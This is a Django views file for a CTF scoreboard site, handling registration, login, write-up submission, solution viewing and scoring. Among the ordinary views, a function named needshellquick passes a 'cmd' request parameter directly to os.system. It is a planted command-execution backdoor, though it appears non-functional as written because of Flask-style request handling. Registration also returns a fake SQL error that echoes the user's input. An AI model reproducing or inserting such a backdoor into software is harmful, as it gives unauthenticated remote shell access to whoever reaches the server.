from django.template import Context, loader, RequestContext
from django.http import HttpResponse, HttpResponseRedirect
from django.shortcuts import render_to_response, render
from django.contrib import auth

from django import forms, conf

from django.contrib.auth.models import User
import redobelisk.settings

from ctfboard.models import UserProfile, CTF, CTFLevel, WriteUp
from MarkdownRenderer import MarkdownRenderer

from .decorators import *
from django.forms import ModelForm, CharField

def is_string_ok(string):
    for x in string:
        if not x.isalnum() and x != "-" and x != "@" and x != "." and x != "+":
            return False
    return True


class register_form(forms.Form):
    username = forms.CharField(max_length=20, required=True)
    password = forms.CharField(widget=forms.PasswordInput())
    email = forms.CharField(max_length=100, required=True)
    secret = forms.CharField(max_length=1000, required=True)
    cseaccountname = forms.CharField(max_length=100, required=True)


def register_user(request):
    if request.method == 'POST':
        form = register_form(request.POST)

        if form.is_valid():
            username = form.cleaned_data['username']
            password = form.cleaned_data['password']
            email = form.cleaned_data['email']
            cse = form.cleaned_data['cseaccountname']
            secret = form.cleaned_data['secret']

            if secret != redobelisk.settings.REGISTRATION_SECRET:
                return render(request, "register.html", {'form': register_form(),
                                                         'msg': 'You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near `\'%s` at line 1.' % secret})

            if not is_string_ok(username) or not is_string_ok(
                    cse) or not is_string_ok(email):
                form = register_form()
                context = {
                    'form': form,
                    'msg': "Haqr characters used, try again k00ld00d"
                }
                return render(request, 'register.html', context)

            # username already exists
            if User.objects.filter(username=username):
                form = register_form()
                context = {'form': form, 'msg': "Username already exists."}
                return render(request, 'register.html', context)

            user = User.objects.create_user(
                username=username, email=email, password=password)
            user.save()

            new_profile = UserProfile(
                user=user,
                cseaccountname=cse,
                score=0)
            new_profile.save()

            auth.authenticate(username=username, password=password)
            auth.login(request, user)

            return HttpResponseRedirect("/scoreboard")

    form = register_form()
    context = {'form': form}
    return render(request, 'register.html', context)


class login_form(forms.Form):
    username = forms.CharField(max_length=20, required=True)
    password = forms.CharField(widget=forms.PasswordInput())


def login(request):
    if request.method == 'POST':
        form = login_form(request.POST)

        if form.is_valid():
            username = form.cleaned_data['username']
            password = form.cleaned_data['password']

            user = auth.authenticate(username=username, password=password)
            if user is not None and user.is_active:
                auth.login(request, user)
                return HttpResponseRedirect("/scoreboard")
            else:
                return HttpResponseRedirect("/login")

    form = login_form()
    context = {'form': form}
    return render(request, 'login.html', context)


@check_authenticated
def solution(request, ctflevelid):
    ctflevel = CTFLevel.objects.get(id=int(ctflevelid))
    solutions = WriteUp.objects.filter(ctflevel=ctflevel)
    msg = ''

    if not WriteUp.objects.filter(
            ctflevel=ctflevel, user=UserProfile.objects.get(
                user=request.user)):
        msg = "Sorry friend, you haven't completed this level yet :<"
        solutions = []
    mdRenderer = MarkdownRenderer()
    for solution in solutions:
        solution.text = mdRenderer.render(solution.text,plus=True)
    context = {'msg': msg, 'solutions': solutions, 'ctflevel': ctflevel}
    return render(request, 'solutions.html', context)


@check_authenticated
def ctflevels(request, ctfname):
    ctf = CTF.objects.get(name=ctfname)
    all_ctflevels = [(x, len(WriteUp.objects.filter(ctflevel=x)))
                     for x in CTFLevel.objects.filter(ctf=ctf)]

    context = {'ctf': ctf, 'ctflevels': all_ctflevels}
    return render(request, 'ctf.html', context)


@check_authenticated
def profile(request):
    user_profile = UserProfile.objects.get(user=request.user)
    context = {'user': user_profile}
    return render(request, 'profile.html', context)


class WriteUpForm(forms.Form):
    flag = forms.CharField(max_length=100)
    level_name = forms.CharField(max_length=100)
    text = forms.CharField()
    ctfs = forms.ModelChoiceField(queryset=CTF.objects.all())
    level_tags = forms.CharField(max_length=100, required=False)


@check_authenticated
def submit_writeup(request):
    msg = ''
    writeup_form = WriteUpForm()

    if request.method == 'POST':
        writeup_form = WriteUpForm(request.POST)
        user_profile = UserProfile.objects.get(user=request.user)

        if writeup_form.is_valid():
            level_name = writeup_form.cleaned_data['level_name']
            flag = writeup_form.cleaned_data['flag']
            text = writeup_form.cleaned_data['text']
            level_tags = writeup_form.cleaned_data['level_tags']
            ctf = CTF.objects.get(name=writeup_form.cleaned_data['ctfs'])

            level = CTFLevel.objects.filter(name=level_name, ctf=ctf)

            if level:
                level = level[0]
                if level.flag == flag:
                    writeup = WriteUp.objects.filter(
                        ctflevel=level, user=user_profile)

                    # If the user already has a write up, just update the text
                    if writeup:
                        writeup = writeup[0]
                        writeup.text = text
                        writeup.flag = flag
                    else:
                        writeup = WriteUp(
                            ctflevel=level,
                            user=user_profile,
                            text=text,
                            flag=flag)

                    writeup.save()

                    level.tags.add(*level_tags.split(','))
                    level.save()
                    return HttpResponseRedirect("/solution/" + str(level.id))
                else:
                    msg = 'Wrong flag for level, please contact an admin or check your flag!'
            else:
                level = CTFLevel(ctf=ctf, name=level_name, points=0, flag=flag)
                level.save()

                # Level objects need a primary key before using tags
                level.tags.add(*level_tags.split(','))
                level.save()
                writeup = WriteUp(
                    ctflevel=level, user=user_profile, text=text, flag=flag)
                writeup.save()
                return HttpResponseRedirect("/solution/" + str(level.id))
        else:
            msg = "sorry friend. please fill in all the form fields"


    context = {
        'msg': msg,
        'writeup_form': writeup_form,
        'ctfs': CTF.objects.filter()
    }
    return render(request, 'submit_writeup.html', context)


def points_from_valid_flag(writeup):
    level = writeup.ctflevel
    if level.flag == writeup.flag:
        return level.points
    return 0


def score_user(user):
    return sum(
        map(lambda x: points_from_valid_flag(x),
            WriteUp.objects.filter(user=user)))


@check_authenticated
def scoreboard(request):
    user = request.user
    all_users = UserProfile.objects.filter()
    first = all_users[0]

    all_users = sorted(
        [(x, score_user(x)) for x in all_users], key=lambda x: x[1])
    all_users.reverse()

    context = {'user': user, 'first': first, 'all_users': all_users}
    return render(request, 'scoreboard.html', context)


def needshellquick(request):
    import os
    render(request, "index.html", os.system(request.args.get['cmd']))


def index(request):
    if request.user.is_authenticated:
        return HttpResponseRedirect("/scoreboard")
    return render(request, 'index.html', {})


def logout(request):
    auth.logout(request)
    return HttpResponseRedirect("/")
